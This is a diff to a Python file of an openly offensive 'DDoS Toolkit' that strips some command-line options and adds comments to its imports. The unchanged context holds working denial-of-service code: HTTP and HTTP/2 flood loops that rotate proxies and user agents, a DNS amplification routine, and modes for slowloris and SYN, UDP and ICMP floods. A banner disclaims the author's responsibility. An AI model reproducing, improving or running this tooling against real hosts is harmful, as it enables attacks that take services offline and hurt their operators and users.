@@ -14,37 +14,37 @@
 # License:           MIT License - https://opensource.org/licenses/MIT
 ### END INIT INFO
 
-# Standard Libraries
-import aiohttp
-import asyncio
-import time
-import argparse
-import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import random
-import json
-from itertools import cycle
-from collections import deque
-from uuid import uuid4
-from base64 import b64encode
-import hashlib
-import zlib  
-import hmac  
-import signal
-import sys
-import os
-import subprocess
-import socket
-import struct  
-import logging
-import psutil  
+# ================== Standard Libraries ====================
+import aiohttp  # Asynchronous HTTP requests for attack simulation.
+import asyncio  # Event loop for handling async tasks.
+import time  # Timing functions for attack intervals.
+import argparse  # Parsing command-line arguments.
+import threading  # Multithreading for concurrent attacks.
+from concurrent.futures import ThreadPoolExecutor, as_completed  # Managing parallel tasks.
+import random  # Randomization for payloads and attack patterns.
+import json  # Handling JSON configuration and outputs.
+from itertools import cycle  # Cycling iterators for proxy rotation.
+from collections import deque  # Efficient data handling for queues.
+from uuid import uuid4  # Unique identifiers for attack instances.
+from base64 import b64encode  # Encoding payloads for attacks.
+import hashlib  # Generating checksums for data integrity.
+import zlib  # Compressing data for payload optimization.
+import hmac  # Creating secure message digests.
+import signal  # Managing process signals (e.g., interruptions).
+import sys  # System-level functions (e.g., exiting on error).
+import os  # Operating system-level operations.
+import subprocess  # Running external commands/tools.
+import socket  # Creating and managing socket connections.
+import struct  # Handling low-level data structures.
+import logging  # Logging attack progress and errors.
+import psutil  # Monitoring system resource usage.
 
-# Third-Party Libraries
-import scapy.all as scapy
-import dns.resolver
-from colorama import init, Fore, Style
-from tqdm import tqdm
-import openai
+# ================== Third-Party Libraries ==================
+import scapy.all as scapy  # Crafting and analyzing packets.
+import dns.resolver  # Resolving DNS queries for amplification.
+from colorama import init, Fore, Style  # Adding color to console outputs.
+from tqdm import tqdm  # Displaying progress bars during attacks.
+import openai  # Integrating AI-based suggestions for optimizations.
 
 # Initialize colorama for colorized terminal output
 init(autoreset=True)
@@ -88,14 +88,14 @@ logging.basicConfig(
 def display_banner():
     print(f"""
 {BLUE}
-████████████████████████████████████████████████████████
+█████████████████████████████████████████████████████████████████
 ██                                                             ██
 ██           DDoS Toolkit v1.6 Coded by LIONMAD                ██
 ██     THIS TOOL CAN BE POWERFUL AND DANGEROUS IF MISUSED      ██                   
 ██        USE WITH CAUTION, PROCEED AT YOUR OWN RISK.          ██
 ██  AUTHOR TAKES NO RESPONSIBILITY FOR YOUR ACTIONS OR DAMAGE  ██ 
 ██                                                             ██ 
-████████████████████████████████████████████████████████
+█████████████████████████████████████████████████████████████████
 {RESET}
 """)
 
@@ -112,12 +112,9 @@ def parse_args():
     parser.add_argument("--results", help="File to save results (JSON)")
     parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
     parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification"], default="http-flood", help="Type of attack to perform")
-    parser.add_argument("--proxy-auth", help="Proxy authentication (username:password)")
     parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
     parser.add_argument("--user-agents", help="File containing custom user-agent strings")
     parser.add_argument("--multi-target", help="File containing multiple target URLs or IPs")
-    parser.add_argument("--custom-payload", help="File containing custom payload data")
-    parser.add_argument("--dynamic-rate-limit", action="store_true", help="Enable dynamic rate limiting based on target response")
     parser.add_argument("--ai-optimization", action="store_true", help="Enable AI-powered optimization")
     parser.add_argument("--scan", action="store_true", help="Perform a network scan using netscan.py")
     return parser.parse_args()
@@ -176,16 +173,8 @@ async def monitor_proxy_health(proxies):
                 print(f"Removed unhealthy proxy: {proxy}")
         await asyncio.sleep(60)  # Check every 60 seconds
 
-def generate_payload(payload_type: str, custom_payload_file: str = None):
+def generate_payload(payload_type: str):
     """Generate a payload for HTTP requests."""
-    if custom_payload_file:
-        try:
-            with open(custom_payload_file, "r") as f:
-                return f.read()
-        except FileNotFoundError:
-            print(f"Custom payload file '{custom_payload_file}' not found.")
-            return None
-
     payload_id = str(uuid4())
     data = b64encode(os.urandom(64)).decode()
     payload = {"id": payload_id, "data": data}
@@ -232,7 +221,6 @@ def run_network_scanner(target_ip):
     except Exception as e:
         print(f"{RED}[!] An unexpected error occurred: {e}{RESET}")
 
-
 async def resolve_target(target_url: str):
     """Resolve the target URL to an IP address."""
     try:
@@ -257,7 +245,7 @@ def is_valid_ip(ip: str):
     except socket.error:
         return False
 
-async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3, custom_payload_file=None):
+async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
     """Perform a rate-limited attack."""
     global requests_sent, successful_requests, failed_requests, last_time
     proxy_pool = cycle(proxies) if proxies else None
@@ -273,7 +261,7 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
                     try:
                         headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                         method = random.choice(HTTP_METHODS)
-                        payload = generate_payload(payload_type, custom_payload_file) if method in ["POST", "PUT", "PATCH"] else None
+                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None
 
                         proxy = next(proxy_pool) if proxy_pool else None
                         async with session.request(
@@ -340,7 +328,7 @@ async def dns_amplification(target_ip, duration):
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
     print("DNS amplification attack completed.")
 
-async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3, custom_payload_file=None):
+async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
     """Perform an HTTP/2 flood attack."""
     global requests_sent, successful_requests, failed_requests, last_time
     proxy_pool = cycle(proxies) if proxies else None
@@ -356,7 +344,7 @@ async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=No
                     try:
                         headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                         method = random.choice(HTTP_METHODS)
-                        payload = generate_payload(payload_type, custom_payload_file) if method in ["POST", "PUT", "PATCH"] else None
+                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None
 
                         proxy = next(proxy_pool) if proxy_pool else None
                         async with session.request(
@@ -378,7 +366,6 @@ async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=No
                             failed_requests += 1
                         logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                 await asyncio.sleep(pause_time)
-
 def display_status(stop_event: threading.Event, duration: int, results_file=None):
     """Display the status of the load test."""
     start_time = time.time()
